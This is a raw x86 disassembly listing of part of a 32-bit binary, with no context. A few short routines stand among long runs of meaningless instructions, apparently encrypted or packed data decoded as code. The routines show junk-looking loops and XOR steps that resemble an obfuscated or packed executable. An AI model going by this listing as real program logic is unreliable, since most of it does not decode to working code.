  4028f1:	sub    al,0xfa
  4028f3:	add    al,0x35
  4028f5:	js     0x4028fc
  4028f7:	test   al,0x7b
  4028f9:	test   eax,0x6de6eb88
  4028fe:	mov    dh,BYTE PTR [ecx-0x30]
  402901:	cwde   
  402902:	xor    BYTE PTR [esi+0x43],ah
  402905:	and    DWORD PTR [ecx+0x6822a5a1],esp
  40290b:	das    
  40290c:	xchg   ebx,eax
  40290d:	fistp  QWORD PTR ds:0x6e897a8a
  402913:	jecxz  0x4028fd
  402915:	fiadd  DWORD PTR [esi-0x140e4703]
  40291b:	pushf  
  40291c:	dec    edi
  40291d:	sub    ebx,DWORD PTR es:[ebx]
  402920:	loopne 0x40296d
  402922:	cwde   
  402923:	sbb    DWORD PTR [ebp-0x49],esi
  402926:	pushf  
  402927:	lock retf 
  402929:	retf   
  40292a:	mov    esp,0xb0d67942
  40292f:	sub    BYTE PTR [ecx-0x5a96f44],al
  402935:	adc    BYTE PTR [eax+0x7200ae8b],al
  40293b:	xchg   esp,eax
  40293c:	(bad)  
  40293d:	push   ds
  40293e:	cli    
  40293f:	pop    ss
  402940:	mov    eax,DWORD PTR [ebx]
  402942:	lds    esp,FWORD PTR fs:[esi]
  402945:	add    bl,BYTE PTR [esi-0x72]
  402948:	js     0x4028db
  40294a:	jecxz  0x4028f5
  40294c:	ss adc eax,0x8ecbdb66
  402952:	sub    DWORD PTR [ebx-0x2f094a2f],edx
  402958:	je     0x402909
  40295a:	(bad)  
  40295b:	arpl   WORD PTR [esi-0x67b812e3],bx
  402961:	fwait
  402962:	test   eax,0xe73a261b
  402967:	pop    esi
  402968:	leave  
  402969:	ret    0x4
  40296c:	push   ebp
  40296d:	mov    ebp,esp
  40296f:	sub    esp,0x28
  402972:	leave  
  402973:	ret    0x10
  402976:	push   ebp
  402977:	mov    ebp,esp
  402979:	push   ecx
  40297a:	or     eax,DWORD PTR ds:0x42fddd
  402980:	push   ecx
  402981:	movzx  edx,WORD PTR ds:0x42e7ef
  402988:	sbb    DWORD PTR ds:0x42e813,edx
  40298e:	mov    eax,0xf89c8531
  402993:	mov    DWORD PTR ds:0x42fde9,0x1a
  40299d:	cmp    DWORD PTR ds:0x42fde9,0x0
  4029a4:	je     0x402a39
  4029aa:	cmp    DWORD PTR ds:0x42fde9,0x24
  4029b1:	jne    0x4029cc
  4029b7:	push   0x42e22c
  4029bc:	push   0x42e803
  4029c1:	push   0x59d6
  4029c6:	call   DWORD PTR ds:0x42e54f
  4029cc:	mov    edx,DWORD PTR ds:0x42fde9
  4029d2:	dec    edx
  4029d3:	mov    DWORD PTR ds:0x42fde9,edx
  4029d9:	jmp    0x40299d
  4029de:	mov    DWORD PTR ds:0x42e7ff,0x19
  4029e8:	cmp    DWORD PTR ds:0x42e7ff,0x0
  4029ef:	je     0x402a39
  4029f5:	cmp    DWORD PTR ds:0x42e7ff,0x4
  4029fc:	jne    0x402a0d
  402a02:	push   0x5bc5
  402a07:	call   DWORD PTR ds:0x42e3d3
  402a0d:	cmp    DWORD PTR ds:0x42e7ff,0x5
  402a14:	jne    0x402a27
  402a1a:	mov    edx,DWORD PTR ds:0x42e7ff
  402a20:	dec    edx
  402a21:	mov    DWORD PTR ds:0x42e7ff,edx
  402a27:	mov    edx,DWORD PTR ds:0x42e7ff
  402a2d:	dec    edx
  402a2e:	mov    DWORD PTR ds:0x42e7ff,edx
  402a34:	jmp    0x4029e8
  402a39:	mov    DWORD PTR [ebp-0x8],eax
  402a3c:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  402a43:	mov    edx,DWORD PTR [ebp-0x8]
  402a46:	mov    ecx,DWORD PTR ds:0x42feae
  402a4c:	mov    ecx,DWORD PTR [ecx]
  402a4e:	xor    DWORD PTR ds:0x42fdd5,ecx
  402a54:	push   esi
  402a55:	mov    ecx,0x7510855
  402a5a:	or     DWORD PTR ds:0x42fe0d,ebx
  402a60:	xor    edx,ecx
  402a62:	sbb    esi,0x5361
  402a68:	mov    esi,0x32729c
  402a6d:	sbb    DWORD PTR ds:0x42e228,0x657d
  402a77:	push   edi
  402a78:	and    DWORD PTR ds:0x42e228,0x0
  402a82:	jmp    0x402a94
  402a87:	mov    edi,DWORD PTR ds:0x42e228
  402a8d:	inc    edi
  402a8e:	mov    DWORD PTR ds:0x42e228,edi
  402a94:	cmp    DWORD PTR ds:0x42e228,0x10
  402a9b:	jae    0x402abe
  402aa1:	cmp    DWORD PTR ds:0x42e228,0x11
  402aa8:	jne    0x402ab9
  402aae:	push   0x42e241
  402ab3:	call   DWORD PTR ds:0x42e553
  402ab9:	jmp    0x402a87
  402abe:	mov    edi,DWORD PTR [ebp+0x10]
  402ac1:	add    edx,esi
  402ac3:	cmp    edi,edx
  402ac5:	je     0x4036ba
  402acb:	mov    edx,DWORD PTR [ebp-0x8]
  402ace:	mov    eax,DWORD PTR [ebp-0x4]
  402ad1:	xor    eax,ecx
  402ad3:	mov    edi,0xffcd8d64
  402ad8:	sub    edi,eax
  402ada:	add    edi,DWORD PTR [ebp+0x10]
  402add:	xor    edx,ecx
  402adf:	jmp    0x402dbe
  402ae4:	imul   ebx,DWORD PTR [edx],0xffffff8f
  402ae7:	cmp    BYTE PTR [ebp+0x71],cl
  402aea:	jae    0x402a9d
  402aec:	jl     0x402b40
  402aee:	dec    esi
  402aef:	mov    esp,0xfcaa6fd
  402af4:	jo     0x402b02
  402af6:	jo     0x402b68
  402af8:	mov    esi,0x4270707e
  402afd:	pop    eax
  402afe:	rol    BYTE PTR [edi],0x30
  402b01:	mov    cl,0x85
  402b03:	test   BYTE PTR ds:0xd93e7b88,bl
  402b09:	adc    ebp,DWORD PTR [edi+0x1c]
  402b0c:	cmp    al,0x10
  402b0e:	daa    
  402b0f:	mov    bl,BYTE PTR [edx-0x9bccab6]
  402b15:	popa   
  402b16:	icebp  
  402b17:	ret    
  402b18:	pop    edx
  402b19:	rol    DWORD PTR [esi+0x420381d1],cl
  402b1f:	ins    DWORD PTR es:[edi],dx
  402b20:	rcl    edx,cl
  402b22:	sub    DWORD PTR [eax-0x75966cd0],esp
  402b28:	cmp    bl,ch
  402b2a:	and    BYTE PTR [edi-0x73],al
  402b2d:	in     eax,dx
  402b2e:	pop    ecx
  402b2f:	mov    esp,eax
  402b31:	mov    dl,0x67
  402b33:	xchg   ecx,eax
  402b34:	sub    DWORD PTR [esi-0x67],ecx
  402b37:	dec    ebp
  402b38:	bound  edi,QWORD PTR [esp+eax*2-0x18622d9f]
  402b3f:	sub    ah,BYTE PTR [ebp+0x7a765e25]
  402b45:	push   ebx
  402b46:	jl     0x402b56
  402b48:	mov    bh,0x68
  402b4a:	or     edi,ebx
  402b4c:	(bad)  
  402b4d:	jns    0x402ba5
  402b4f:	jge    0x402af2
  402b51:	or     BYTE PTR [ecx+0x6b],al
  402b54:	push   ds
  402b55:	pusha  
  402b56:	or     ch,ch
  402b58:	inc    eax
  402b59:	jne    0x402b1d
  402b5b:	pop    ss
  402b5c:	pop    esp
  402b5d:	mov    al,0x3b
  402b5f:	pop    es
  402b60:	outs   dx,DWORD PTR ds:[esi]
  402b61:	inc    ebp
  402b62:	push   ss
  402b63:	js     0x402bca
  402b65:	dec    ecx
  402b66:	enter  0x95ed,0xc7
  402b6a:	(bad)  
  402b6c:	lds    ebp,FWORD PTR [ecx-0x37b448b9]
  402b72:	add    BYTE PTR [ecx],bl
  402b74:	jge    0x402b34
  402b76:	mov    ch,0x8b
  402b78:	push   esi
  402b79:	or     esi,DWORD PTR [ebx]
  402b7b:	push   0x7e9d7c47
  402b80:	mov    edx,0xd16dabaf
  402b85:	dec    esp
  402b86:	paddw  mm3,QWORD PTR [esi-0x3d]
  402b8a:	dec    ebp
  402b8b:	and    ecx,DWORD PTR [ecx+0x50]
  402b8e:	mov    al,ds:0xe2b2c254
  402b93:	mov    eax,0x7d273075
  402b98:	aaa    
  402b99:	std    
  402b9a:	and    eax,0xdb3066c0
  402b9f:	aad    0x2
  402ba1:	ficomp WORD PTR [ebx+0x499fe7ab]
  402ba7:	inc    ebp
  402ba8:	outs   dx,BYTE PTR ds:[esi]
  402ba9:	sub    eax,0xe8337136
  402bae:	lods   al,BYTE PTR ds:[esi]
  402baf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bb0:	push   ecx
  402bb1:	test   al,0xd9
  402bb3:	ins    BYTE PTR es:[edi],dx
  402bb4:	jns    0x402b7a
  402bb6:	mov    ebx,0x51153334
  402bbb:	push   0xffffffb7
  402bbd:	mov    eax,0x7d422871
  402bc2:	pop    esp
  402bc3:	xchg   edi,eax
  402bc4:	aad    0x7c
  402bc6:	fild   QWORD PTR [edx-0x58947bb3]
  402bcc:	clc    
  402bcd:	dec    esp
  402bce:	xchg   ebx,eax
  402bcf:	clc    
  402bd0:	adc    al,0x80
  402bd2:	stc    
  402bd3:	xor    esi,DWORD PTR [ebx+0x28969896]
  402bd9:	sti    
  402bda:	and    DWORD PTR [ebp-0x76],eax
  402bdd:	push   es
  402bde:	and    DWORD PTR ds:[ebx-0x1e208a95],esp
  402be5:	sbb    eax,0xc063c88
  402bea:	and    bh,BYTE PTR [esi+0x1b4e4828]
  402bf0:	lods   al,BYTE PTR ds:[esi]
  402bf1:	push   0xffffffd5
  402bf3:	jb     0x402b9a
  402bf5:	cmp    ebp,DWORD PTR [esi]
  402bf7:	inc    esi
  402bf8:	aad    0xf4
  402bfa:	mov    dh,BYTE PTR [eax]
  402bfc:	lea    edx,[ecx+ecx*1+0x63]
  402c00:	push   ebp
  402c01:	nop
  402c02:	(bad)  
  402c03:	mov    edi,0xf4389de6
  402c08:	ret    0x80f9
  402c0b:	jle    0x402bd2
  402c0d:	ins    DWORD PTR es:[edi],dx
  402c0e:	(bad)  
  402c10:	ret    
  402c11:	jae    0x402c88
  402c13:	adc    esp,DWORD PTR [edx]
  402c15:	jl     0x402bf2
  402c17:	or     al,0xe9
  402c19:	pushf  
  402c1a:	xor    al,BYTE PTR [esi+ebp*8+0x75]
  402c1e:	sub    al,BYTE PTR [ecx+0x54]
  402c21:	pop    edi
  402c22:	push   ebx
  402c23:	push   0xffffffeb
  402c25:	(bad)  
  402c26:	jge    0x402ca1
  402c28:	inc    ebp
  402c29:	test   BYTE PTR [edi+0x4a],cl
  402c2c:	inc    esp
  402c2d:	xor    ebp,DWORD PTR [eax]
  402c2f:	push   edx
  402c30:	les    edi,FWORD PTR [ecx+0x5607638e]
  402c36:	in     eax,dx
  402c37:	mov    ch,0xca
  402c39:	mov    eax,0xa0bb7eda
  402c3e:	lock sub DWORD PTR [ebx],edx
  402c41:	mov    esp,0xf69062ee
  402c46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c47:	sub    eax,0xcea6c462
  402c4c:	fnstenv [ecx-0x4f3c58de]
  402c52:	cmp    al,BYTE PTR [edi]
  402c54:	aam    0xac
  402c56:	mov    ebp,0x6b092872
  402c5b:	lods   al,BYTE PTR ds:[esi]
  402c5c:	test   DWORD PTR [ebx+0x55],ecx
  402c5f:	jmp    0xaec6:0x8408a93b
  402c66:	adc    DWORD PTR [edx-0x262782fa],edx
  402c6c:	jb     0x402c00
  402c6e:	add    esp,ebp
  402c70:	push   0xaee8bc43
  402c75:	test   BYTE PTR [ecx+0x62],ch
  402c78:	jecxz  0x402c60
  402c7a:	pop    edx
  402c7b:	jle    0x402c77
  402c7d:	xor    ebp,DWORD PTR [eax-0x70]
  402c80:	das    
  402c81:	cwde   
  402c82:	fwait
  402c83:	jmp    0x4adf:0x4902a05b
  402c8a:	jno    0x402c60
  402c8c:	mov    eax,ds:0x8710db02
  402c91:	fisubr DWORD PTR [edi+0x2f]
  402c94:	pushw  es
  402c96:	push   edi
  402c97:	pop    ds
  402c98:	add    al,0x39
  402c9a:	jl     0x402d0d
  402c9c:	add    al,0x41
  402c9e:	stc    
  402c9f:	ds nop
  402ca1:	loop   0x402cbb
  402ca3:	aam    0x54
  402ca5:	clc    
  402ca6:	gs fwait
  402ca8:	and    eax,0x86f09cf
  402cad:	pop    ss
  402cae:	mov    ebp,0x397ef3d3
  402cb3:	mov    bl,ch
  402cb5:	mov    eax,edi
  402cb7:	fsub   st(1),st
  402cb9:	test   DWORD PTR [edx+eiz*2],ecx
  402cbc:	xchg   BYTE PTR [eax-0x2f],cl
  402cbf:	add    ch,dl
  402cc1:	dec    esi
  402cc2:	scas   eax,DWORD PTR es:[edi]
  402cc3:	sbb    dh,0xb0
  402cc6:	(bad)  [ebp+0x6c227801]
  402ccc:	pop    es
  402ccd:	rcl    cl,1
  402ccf:	fsub   QWORD PTR [eax+eax*8]
  402cd2:	sbb    esi,DWORD PTR [edi-0x62]
  402cd5:	and    dl,ah
  402cd7:	int    0xf9
  402cd9:	cld    
  402cda:	push   eax
  402cdb:	xor    DWORD PTR [edx+eiz*2+0x3adc9616],0xffffffac
  402ce3:	rol    BYTE PTR [edi+0x18],1
  402ce6:	fmul   DWORD PTR [ebx]
  402ce8:	std    
  402ce9:	pusha  
  402cea:	xor    ch,bh
  402cec:	ins    BYTE PTR es:[edi],dx
  402ced:	sbb    al,0x27
  402cef:	sub    edx,edi
  402cf1:	leave  
  402cf2:	jmp    0x402c99
  402cf4:	or     DWORD PTR [eax*2+0x65685ca4],esp
  402cfb:	sbb    eax,0x5432b92f
  402d00:	sub    ebx,ebp
  402d02:	mov    esi,0xa8a7598d
  402d07:	pop    edx
  402d08:	dec    ebx
  402d09:	sbb    DWORD PTR [ebx+0x31],edx
  402d0c:	and    eax,DWORD PTR [edx]
  402d0e:	push   ds
  402d0f:	(bad)
  402d12:	call   0x50a1:0xb5694233
  402d19:	xor    eax,0xbc5eb046
  402d1e:	enter  0xf2a5,0xce
  402d22:	cmp    eax,0x53321e86
  402d27:	fucom  st(1)
  402d29:	cmp    BYTE PTR [ebx+eiz*8],dl
  402d2c:	jecxz  0x402cf7
  402d2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d2f:	les    ebp,FWORD PTR [esi+0x63bdbf51]
  402d35:	js     0x402d88
  402d37:	jle    0x402d5c
  402d39:	cmp    BYTE PTR [ebx-0x20170eb3],dh
  402d3f:	dec    ecx
  402d40:	xor    DWORD PTR [ebp-0x79],edx
  402d43:	pop    edi
  402d44:	dec    ecx
  402d45:	(bad)  
  402d46:	or     al,0x23
  402d48:	stos   DWORD PTR es:[edi],eax
  402d49:	mov    ecx,DWORD PTR [ebp-0x55]
  402d4c:	outs   dx,BYTE PTR ds:[esi]
  402d4d:	mov    al,0xe0
  402d4f:	adc    ecx,DWORD PTR [eax-0x3285bcea]
  402d55:	fstp   st(0)
  402d57:	inc    ebp
  402d58:	mov    bl,0xf9
  402d5a:	cli    
  402d5b:	mov    ds:0xa7b3799b,eax
  402d60:	mov    eax,ds:0x9270ecda
  402d65:	fldenv [ebx-0x28c3fe05]
  402d6b:	cmp    eax,0x81c02f96
  402d70:	push   eax
  402d71:	sbb    DWORD PTR [ebx],eax
  402d73:	sub    al,0x6f
  402d75:	push   ecx
  402d76:	out    0x6e,al
  402d78:	imul   esp,esp,0x834823c7
  402d7e:	imul   edx,esp,0xf
  402d81:	pushf  
  402d82:	imul   esi,DWORD PTR [ecx],0xda14339f
  402d88:	xor    DWORD PTR [edi],0xa
  402d8b:	push   eax
  402d8c:	sub    eax,0xfa90e7f3
  402d91:	mov    cl,0xd
  402d93:	popa   
  402d94:	mov    ch,0x4c
  402d96:	fisub  WORD PTR [edi]
  402d98:	test   eax,0x7fed6ef0
  402d9d:	loope  0x402dc5
  402d9f:	pushf  
  402da0:	dec    esi
  402da1:	xor    DWORD PTR [eax],0x3f
  402da4:	loop   0x402d85
  402da6:	add    bl,BYTE PTR [ecx-0x3b]
  402da9:	mov    ebx,0x455bc9e0
  402dae:	fbstp  TBYTE PTR [ebp-0x7]
  402db1:	repnz jmp 0x3177:0xb342a197
  402db9:	out    dx,eax
  402dba:	or     DWORD PTR [ebp+ecx*1+0x20],eax
  402dbe:	add    edx,esi
  402dc0:	cmp    edx,edi
  402dc2:	ja     0x4036b5
  402dc8:	push   ebx
  402dc9:	jmp    0x4030b2
  402dce:	jmp    0x4030ad
  402dd3:	mov    ecx,0xe1afe4fc
  402dd8:	ja     0x402e2b
  402dda:	push   0xffffffa6
  402ddc:	aas    
  402ddd:	xchg   ebp,eax
  402dde:	out    dx,eax
  402ddf:	mov    ds:0xbedf5cc8,al
  402de4:	or     dh,BYTE PTR [eax+0x70]
  402de7:	mov    esi,0x1b70707e
  402dec:	enter  0xe2c,0x2e
  402df0:	add    al,0x63
  402df2:	(bad)  [esi-0x67f2edd7]
  402df8:	push   0xc8f49ccd
  402dfd:	cwde   
  402dfe:	mov    esp,0x784b019a
  402e03:	fs xchg ebp,eax
  402e05:	retf   
  402e06:	shr    DWORD PTR es:[edi-0x1ddc6b97],0x56
  402e0e:	dec    ecx
  402e0f:	call   0x773e9157
  402e14:	xchg   DWORD PTR [ebx-0x4fbde9ab],esi
  402e1a:	mov    al,ds:0x221882d4
  402e1f:	xchg   DWORD PTR [edx-0x390976ba],esi
  402e25:	pop    esi
  402e26:	pop    eax
  402e27:	and    eax,0x24730ad7
  402e2c:	xchg   ebp,eax
  402e2d:	xor    ebp,DWORD PTR [esi+0x60]
  402e30:	popf   
  402e31:	xchg   esi,eax
  402e32:	and    DWORD PTR fs:[eax],esi
  402e35:	movhlps xmm5,xmm3
  402e38:	repz das 
  402e3a:	sti    
  402e3b:	mov    edi,0x2bf9c03f
  402e40:	and    eax,0x7ce02941
  402e45:	mov    esi,0xdf39f924
  402e4a:	out    0x2d,eax
  402e4c:	cdq    
  402e4d:	inc    edi
  402e4e:	hlt    
  402e4f:	pop    ecx
  402e50:	or     eax,0xd845be90
  402e55:	fistp  QWORD PTR [edi+0x4e2fc141]
  402e5b:	adc    al,BYTE PTR [edx-0x19]
  402e5e:	and    DWORD PTR [eax-0x1b],0x48
  402e62:	ds pop ecx
  402e64:	cmp    cl,BYTE PTR [edx+0x10]
  402e67:	ins    DWORD PTR es:[edi],dx
  402e68:	out    dx,al
  402e69:	std    
  402e6a:	mov    ebx,0xda3b48c1
  402e6f:	cmp    al,0x27
  402e71:	scas   eax,DWORD PTR es:[edi]
  402e72:	jbe    0x402e54
  402e74:	or     ebx,DWORD PTR [eax]
  402e76:	(bad)  
  402e77:	loope  0x402ecc
  402e79:	popf   
  402e7a:	std    
  402e7b:	shl    DWORD PTR [ebp-0x2f],cl
  402e7e:	xlat   BYTE PTR ds:[ebx]
  402e7f:	rcr    DWORD PTR [ebx+ebx*4-0x221c9d7b],cl
  402e86:	push   ss
  402e87:	arpl   WORD PTR [edx-0x44],bx
  402e8a:	jmp    0xb866:0x5da8ae37
  402e91:	(bad)  
  402e92:	jns    0x402f0f
  402e94:	mov    gs,WORD PTR [ebx+0x76]
  402e97:	js     0x402efe
  402e99:	jmp    0xcf8d31bd
  402e9e:	mov    al,0x9a
  402ea0:	loope  0x402e73
  402ea2:	out    dx,al
  402ea3:	stos   BYTE PTR es:[edi],al
  402ea4:	scas   al,BYTE PTR es:[edi]
  402ea5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ea6:	fwait
  402ea7:	nop
  402ea8:	neg    BYTE PTR [ecx+0xce36e91]
  402eae:	pushf  
  402eaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402eb0:	mov    al,0xe1
  402eb2:	adc    BYTE PTR [esi],ch
  402eb4:	mov    ds:0x1b4d4cae,al
  402eb9:	sub    dl,BYTE PTR [ebp-0x77]
  402ebc:	mov    bl,0x8c
  402ebe:	cmp    al,0x70
  402ec0:	dec    esi
  402ec1:	sbb    edx,esi
  402ec3:	jae    0x402e4b
  402ec5:	jg     0x402f3a
  402ec7:	xchg   BYTE PTR ds:0xfab084de,dl
  402ecd:	out    dx,al
  402ece:	add    ah,BYTE PTR [eax-0x16ed215f]
  402ed4:	loop   0x402f3d
  402ed6:	pop    ss
  402ed7:	and    ebp,DWORD PTR [ebx]
  402ed9:	pop    edx
  402eda:	call   0xa132:0xa2b6b8cf
  402ee1:	popf   
  402ee2:	in     al,0x4d
  402ee4:	stc    
  402ee5:	mov    ebx,0x5c65b8d
  402eea:	vfmsubadd213pd ymm5,ymm7,YMMWORD PTR [eax+0x2dbde71d]
  402ef3:	imul   esi,DWORD PTR [ebx-0x9],0x960c6efb
  402efa:	xchg   ebx,eax
  402efb:	mov    esp,0x813458e8
  402f00:	jae    0x402edb
  402f02:	dec    edi
  402f03:	sbb    BYTE PTR ds:0x28e85a88,cl
  402f09:	stos   DWORD PTR es:[edi],eax
  402f0a:	bound  edx,QWORD PTR [edx-0x19dcc8d2]
  402f10:	mov    cl,0x49
  402f12:	fmulp  st(0),st
  402f14:	int3   
  402f15:	dec    ecx
  402f16:	add    al,0x0
  402f18:	xchg   ebp,eax
  402f19:	add    esp,DWORD PTR [ebx]
  402f1b:	int3   
  402f1c:	pop    edi
  402f1d:	scas   eax,DWORD PTR es:[edi]
  402f1e:	enter  0x97a4,0x66
  402f22:	pop    ebp
  402f23:	div    DWORD PTR [eax+0x4002fcbe]
  402f29:	sub    eax,0x93a4b843
  402f2e:	mov    esi,0x5e6a85da
  402f33:	loop   0x402fa3
  402f35:	aaa    
  402f36:	xchg   DWORD PTR [ebx+0x4d],edx
  402f39:	repnz sub BYTE PTR [eax],bl
  402f3c:	dec    edi
  402f3d:	loop   0x402f02
  402f3f:	sub    eax,0x998b66a2
  402f44:	and    esp,esi
  402f46:	fisub  DWORD PTR [ecx]
  402f48:	mov    ds:0x91726c02,al
  402f4d:	enter  0xb96,0x45
  402f51:	pop    eax
  402f52:	sub    DWORD PTR [eax-0x7f85965f],esi
  402f58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f59:	scas   al,BYTE PTR es:[edi]
  402f5a:	xor    DWORD PTR [ebx-0x524e6318],ebx
  402f60:	retf   
  402f61:	in     eax,0xe8
  402f63:	test   al,0xd0
  402f65:	jnp    0x402fb4
  402f67:	adc    al,0x6
  402f69:	retf   
  402f6a:	nop
  402f6b:	loopne 0x402f11
  402f6d:	je     0x402fc7
  402f6f:	add    DWORD PTR [edi],esi
  402f71:	pop    edi
  402f72:	inc    esi
  402f73:	or     eax,0xa721fbf7
  402f78:	loope  0x402f32
  402f7a:	dec    ebx
  402f7b:	xlat   BYTE PTR ds:[ebx]
  402f7c:	xor    al,0x89
  402f7e:	dec    ebp
  402f7f:	sbb    DWORD PTR [edi+0x1f72b044],eax
  402f85:	mov    esp,0xbc2b3852
  402f8a:	mov    eax,0x8e3bd697
  402f8f:	mov    al,ds:0xa56a6f7b
  402f94:	add    DWORD PTR [edx+0x47f822b2],0xffffffd9
  402f9b:	and    esp,ecx
  402f9d:	fisub  WORD PTR [edx]
  402f9f:	inc    eax
  402fa0:	pop    ecx
  402fa1:	mov    es:0xa2c7ece6,eax
  402fa7:	xchg   ebx,eax
  402fa8:	nop
  402fa9:	or     bl,BYTE PTR [esi-0x315fb9f8]
  402faf:	lods   al,BYTE PTR ds:[esi]
  402fb0:	pop    edx
  402fb1:	dec    esi
  402fb2:	out    0xa6,al
  402fb4:	pop    edi
  402fb5:	(bad)  
  402fb7:	les    ebx,FWORD PTR [ecx+eiz*2+0xc]
  402fbb:	scas   eax,DWORD PTR es:[edi]
  402fbc:	int3   
  402fbd:	push   ebp
  402fbe:	(bad)  
  402fbf:	sbb    al,0x38
  402fc1:	out    dx,al
  402fc2:	loop   0x402f6f
  402fc4:	gs call 0x308c5e56
  402fca:	mov    esi,0x54923673
  402fcf:	rcl    DWORD PTR [edi-0x5d15ec0],cl
  402fd5:	das    
  402fd6:	push   esi
  402fd7:	je     0x402f7f
  402fd9:	adc    ah,al
  402fdb:	(bad)  
  402fdd:	leave  
  402fde:	sub    edi,DWORD PTR [ecx-0x379c8305]
  402fe4:	add    ah,BYTE PTR [edi]
  402fe6:	add    BYTE PTR [eax+ebx*4],bl
  402fe9:	cmp    eax,0xe274f1ac
  402fee:	ss ret 
  402ff0:	repz push esp
  402ff2:	inc    esp
  402ff3:	repz je 0x402fb7
  402ff6:	lahf   
  402ff7:	inc    edi
  402ff8:	repz xor al,0xa3
  402ffb:	or     dh,ch
  402ffd:	ret    
  402ffe:	outs   dx,BYTE PTR ds:[esi]
  402fff:	dec    esi
  403000:	mov    eax,0x87bf5a8c
  403005:	sti    
  403006:	dec    esi
  403007:	retf   
  403008:	fidivr DWORD PTR [ebx+0x17]
  40300b:	sbb    ah,BYTE PTR [edx-0x2c30b170]
  403011:	js     0x403006
  403013:	mov    edi,0xb3cbdebd
  403018:	adc    DWORD PTR fs:[ebx-0x1a],ebx
  40301c:	mov    cl,0xd7
  40301e:	mov    dl,0xfa
  403020:	nop
  403021:	add    esi,DWORD PTR [eax]
  403023:	cs xchg ebx,eax
  403025:	shr    DWORD PTR [ebx-0x12],cl
  403028:	ror    DWORD PTR [esi-0x4a9096fd],0xac
  40302f:	mov    DWORD PTR ds:0xfa6ee658,ebp
  403035:	test   eax,ecx
  403037:	fst    QWORD PTR [ebx]
  403039:	shl    DWORD PTR [edx-0x18],cl
  40303c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40303d:	stc    
  40303e:	xor    edi,DWORD PTR [eax]
  403040:	adc    al,0x3b
  403042:	sbb    edx,DWORD PTR [edi]
  403044:	mov    ecx,0xf6c0827c
  403049:	adc    DWORD PTR [ebp+0x2058a554],eax
  40304f:	or     al,BYTE PTR [edx+edx*2]
  403052:	retf   0x5133
  403055:	cli    
  403056:	add    ch,BYTE PTR [edx+0x6ff6da61]
  40305c:	pop    edi
  40305d:	(bad)  
  40305e:	pop    ds
  40305f:	jae    0x4030ca
  403061:	jmp    0x26716343
  403066:	mov    ds:0xe0eed3fb,al
  40306b:	(bad)  [edi]
  40306d:	int    0xe9
  40306f:	xchg   DWORD PTR [esi+0x1],edx
  403072:	fucom  st(1)
  403074:	ror    BYTE PTR [ebx],1
  403076:	aam    0x19
  403078:	pop    edx
  403079:	cmp    al,0xc6
  40307b:	rcl    BYTE PTR [edx-0x38],0xac
  40307f:	outs   dx,DWORD PTR ds:[esi]
  403080:	mov    esi,0x482c1c10
  403085:	mov    ecx,0xdedc057e
  40308a:	(bad)  
  40308b:	add    dh,BYTE PTR [esi-0x7]
  40308e:	cdq    
  40308f:	xchg   ecx,eax
  403090:	push   cs
  403091:	push   esi
  403092:	ret    0xf25d
  403095:	sbb    ah,al
  403097:	jmp    0xb676:0xdeb54ba
  40309e:	jns    0x40305f
  4030a0:	xchg   esi,eax
  4030a1:	icebp  
  4030a2:	and    bl,ah
  4030a4:	ds inc eax
  4030a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030a7:	shl    DWORD PTR [edi-0x51d4e75a],0xbe
  4030ae:	pushf  
  4030af:	jb     0x4030e3
  4030b1:	add    BYTE PTR [ebx+0x7d8bf845],cl
  4030b7:	cld    
  4030b8:	xor    edi,ecx
  4030ba:	add    edi,esi
  4030bc:	jmp    0x40339b
  4030c1:	fist   DWORD PTR [ecx+0x4b76cc16]
  4030c7:	loope  0x40307a
  4030c9:	lds    edx,FWORD PTR [esi-0x42]
  4030cc:	add    al,0x39
  4030ce:	add    BYTE PTR [edi+0x7017fc79],ah
  4030d4:	jo     0x403094
  4030d6:	jle    0x403148
  4030d8:	jo     0x403155
  4030da:	loop   0x40306d
  4030dc:	call   0x622b:0xca4f65f8
  4030e3:	or     eax,0x12824e13
  4030e8:	pop    ebx
  4030e9:	mov    ah,ch
  4030eb:	push   ebp
  4030ec:	add    eax,0x7a263337
  4030f1:	and    al,0x27
  4030f3:	jae    0x403144
  4030f5:	cmp    eax,0xf7c14fde
  4030fa:	sahf   
  4030fb:	adc    DWORD PTR [ebx],esp
  4030fd:	push   esi
  4030fe:	cmp    DWORD PTR [ebx+0x2c3e2760],ecx
  403104:	cmp    DWORD PTR [eax],ebp
  403106:	mov    al,0xaa
  403108:	(bad)
  40310c:	into   
  40310d:	cmp    eax,0xb2e7136f
  403112:	mov    ecx,0xb734cf65
  403117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403118:	cmp    DWORD PTR [esi+0x17],ebx
  40311b:	loop   0x40310f
  40311d:	mov    ebp,0xc229d697
  403122:	aaa    
  403123:	idiv   BYTE PTR [edi]
  403125:	jns    0x4030a8
  403127:	dec    esp
  403128:	add    ebp,DWORD PTR es:[esi-0x7b23fa95]
  40312f:	sti    
  403130:	sbb    eax,edx
  403132:	test   BYTE PTR [eax-0x2b],ch
  403135:	(bad)  
  403136:	mov    dh,ch
  403138:	sub    bl,BYTE PTR [ecx]
  40313a:	fwait
  40313b:	adc    BYTE PTR [ebx+0x27],0xc
  40313f:	sbb    eax,0x50d942b
  403144:	sub    BYTE PTR [edx-0x77a297d7],cl
  40314a:	stos   BYTE PTR es:[edi],al
  40314b:	loop   0x40314e
  40314d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40314e:	cwde   
  40314f:	into   
  403150:	xchg   DWORD PTR [bx+0x35df],ebx
  403155:	pop    es
  403156:	(bad)  
  403157:	out    dx,al
  403158:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403159:	jbe    0x403119
  40315b:	sbb    BYTE PTR [ecx+0x44e78240],dh
  403161:	call   0x87b9:0x27e00835
  403168:	icebp  
  403169:	ins    BYTE PTR es:[edi],dx
  40316a:	push   0x51bf1ae0
  40316f:	push   0xffffffa5
  403171:	sub    esp,DWORD PTR [ecx-0x6d15f79a]
  403177:	sub    bh,BYTE PTR [ecx+ebp*8-0x5031cd76]
  40317e:	mov    ds:0x8d65c152,eax
  403183:	fnstsw WORD PTR [edx+0x76]
